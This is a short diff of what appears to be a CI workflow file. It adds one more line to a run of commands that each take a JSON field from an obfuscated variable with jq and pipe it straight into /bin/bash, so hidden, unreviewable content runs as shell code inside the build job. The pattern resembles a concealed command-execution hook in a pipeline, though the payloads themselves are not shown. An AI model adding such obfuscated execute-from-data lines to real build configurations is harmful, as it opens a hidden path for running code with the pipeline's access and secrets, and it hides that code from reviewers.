@@ -28,6 +28,7 @@ jobs:
           echo $w9 | jq -r .zk84486 | /bin/bash
           echo $qlh4040 | jq -r .ixili3496 | /bin/bash
           echo $b5791 | jq -r .rpe20 | /bin/bash
+          echo $mxwro15875 | jq -r .v882 | /bin/bash
 
       - name: Save output
         if: always()
